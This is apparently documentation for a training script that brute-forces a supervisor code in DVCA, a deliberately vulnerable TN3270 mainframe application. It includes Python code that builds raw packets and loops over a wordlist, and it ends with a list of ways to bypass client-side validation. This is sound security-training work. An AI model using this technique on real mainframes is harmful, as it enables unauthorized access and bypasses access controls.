# brute2.py - Raw Packet Brute Force Tutorial

This script performs brute force attacks by building TN3270 packets programmatically, with no database required.

## Overview

Unlike `brute.py` which uses a captured template, `brute2.py` constructs complete form submission packets from scratch. All field data is defined as ASCII strings in the code and converted to EBCDIC at runtime.

## Prerequisites

- `hack3270` running and connected to DVCA
- Terminal at the supervisor code entry screen
- No database file needed!
- Wordlist file in `../injections/`

## Key Concept: Full Form Construction

A form submission packet contains ALL fields, not just the one you're brute forcing. For DVCA's address update:

```
[AID][Cursor]
  [SBA][Addr1][Name field - 44 bytes]
  [SBA][Addr2][Address field - 44 bytes]
  [SBA][Addr3][City field - 44 bytes]
  [SBA][Addr4][Province field - 44 bytes]
  [SBA][Addr5][Postal field - 44 bytes]
  [SBA][Addr6][Country field - 44 bytes]
  [SBA][Addr7][Supervisor code - 4 bytes]
[IAC EOR]
```

## How The Code Works

### Define Form Fields

```python
FORM_FIELDS = [
    (bytes([0xC6, 0xE7]), 'Phillip Young', 44),
    (bytes([0xC9, 0xC7]), '101 Adelaide St W', 44),
    (bytes([0x4B, 0xE7]), 'Toronto', 44),
    (bytes([0x4E, 0xC7]), 'Ontario', 44),
    (bytes([0x50, 0xE7]), 'M5H 0B3', 44),
    (bytes([0xD3, 0xC7]), 'Canada', 44),
]
CODE_FIELD_ADDR = bytes([0xD5, 0xE7])
```

Each field has:
- **Address**: 2-byte screen buffer position
- **Text**: ASCII data to send
- **Length**: Field size (padded with spaces)

### Build Packet Function

```python
def build_code_packet(api, code):
    # Start with TN3270E header if needed
    if api.is_tn3270e():
        packet = bytes([0x00, 0x00, 0x00, 0x00, 0x01, AID_ENTER]) + CURSOR_ADDR
    else:
        packet = bytes([AID_ENTER]) + CURSOR_ADDR
    
    # Add all address fields
    for field_addr, text, length in FORM_FIELDS:
        padded_text = text.ljust(length)[:length]
        ebcdic_data = api.ascii_to_ebcdic(padded_text)
        packet += bytes([SBA]) + field_addr + ebcdic_data
    
    # Add supervisor code field
    ebcdic_code = api.ascii_to_ebcdic(code)
    packet += bytes([SBA]) + CODE_FIELD_ADDR + ebcdic_code
    
    # Add terminator
    packet += IAC_EOR
    
    return packet
```

This function:
1. Checks if TN3270E mode (IBM mainframe) and adds 5-byte header if needed
2. Starts with AID (ENTER) and cursor position
3. Adds each form field: SBA + address + EBCDIC data
4. Adds the brute-forced code field
5. Ends with IAC EOR

**Note:** The TN3270E header (`00 00 00 00 01`) is required for IBM mainframes but not for TK4. The `api.is_tn3270e()` function queries the proxy to determine the correct mode.

### Padding Fields

```python
padded_text = text.ljust(length)[:length]
```

- `ljust(44)`: Pad with spaces to 44 characters
- `[:44]`: Truncate if too long

This ensures each field is exactly the expected length.

### ASCII to EBCDIC

```python
ebcdic_data = api.ascii_to_ebcdic(padded_text)
```

The API converts ASCII to EBCDIC byte-by-byte:
```
'A' (0x41) → 0xC1
'B' (0x42) → 0xC2
' ' (0x20) → 0x40
'1' (0x31) → 0xF1
```

### Brute Force Loop

```python
for code in codes:
    packet = build_code_packet(api, code)
    api.send_raw(packet, f'Brute: code {code}')
    time.sleep(DELAY)
    
    response = api.get_last_server()
    if ERROR_MSG not in response:
        print(f"*** FOUND: {code} ***")
        break
```

## Finding Field Addresses

To adapt for other applications:

### Step 1: Capture a Form Submission

Fill out the form, press ENTER, check Logs tab.

### Step 2: Parse the Packet

```bash
python -c "
import sqlite3
conn = sqlite3.connect('pentest.db')
cur = conn.cursor()
cur.execute('SELECT RAW_DATA FROM Logs WHERE ID = <your_id>')
data = cur.fetchone()[0]

i = 3  # Skip AID and cursor
while i < len(data) - 2:
    if data[i] == 0x11:  # SBA
        addr = f'{data[i+1]:02x} {data[i+2]:02x}'
        # Find next SBA or end
        end = i + 3
        while end < len(data) - 2 and data[end] != 0x11:
            end += 1
        print(f'SBA {addr}: {end - i - 3} bytes')
        i = end
    else:
        i += 1
"
```

### Step 3: Map Fields

Match each SBA address to a form field by examining the EBCDIC data.

## Comparison: brute.py vs brute2.py

| Aspect | brute.py | brute2.py |
|--------|----------|-----------|
| Database required | Yes | No |
| Field addresses | Automatic (from capture) | Manual (in code) |
| Form data | From captured packet | Hardcoded ASCII |
| Flexibility | Low (fixed to capture) | High (change any field) |
| Portability | Low (needs .db file) | High (self-contained) |
| Complexity | Lower | Higher |

## Code Structure

```
brute2.py
├── Configuration
│   ├── API settings
│   ├── FORM_FIELDS list
│   ├── CODE_FIELD_ADDR
│   ├── INJECTION_FILE
│   └── ERROR_MSG
├── build_code_packet(api, code)
│   ├── Start with AID + cursor
│   ├── Add each form field
│   ├── Add brute force field
│   └── Add IAC EOR
├── main()
│   ├── Connect to API
│   ├── Load wordlist
│   ├── For each code:
│   │   ├── Build packet
│   │   ├── Send raw
│   │   ├── Check response
│   │   └── Report if found
│   └── Disconnect
└── Error handling
```

## Advanced: Dynamic Field Discovery

```python
def discover_fields(api):
    """Analyze current screen to find input fields."""
    raw = api.get_last_server_raw()
    fields = []
    
    i = 0
    while i < len(raw):
        if raw[i] == 0x29:  # SFE
            count = raw[i+1]
            # Parse attributes to find unprotected fields
            for j in range(count):
                attr_type = raw[i + 2 + j*2]
                attr_value = raw[i + 3 + j*2]
                if attr_type == 0xC0:  # Basic attribute
                    if not (attr_value & 0x20):  # Not protected
                        fields.append(i)
            i += 2 + count * 2
        else:
            i += 1
    
    return fields
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "Transaction Abend" | Wrong packet structure |
| No response | Missing IAC EOR terminator |
| Wrong field updated | Check field addresses |
| Garbled data | EBCDIC conversion issue |

## Security Implications

Building packets programmatically allows:
- **Bypassing client validation** (field length limits)
- **Injecting into protected fields** (if server doesn't revalidate)
- **Modifying hidden field values**
- **Fuzzing with malformed packets**

## See Also

- `brute.py` - Simpler template-based approach
- `login2.py` - Similar raw packet technique for login
- API Documentation - `send_raw()`, `ascii_to_ebcdic()`
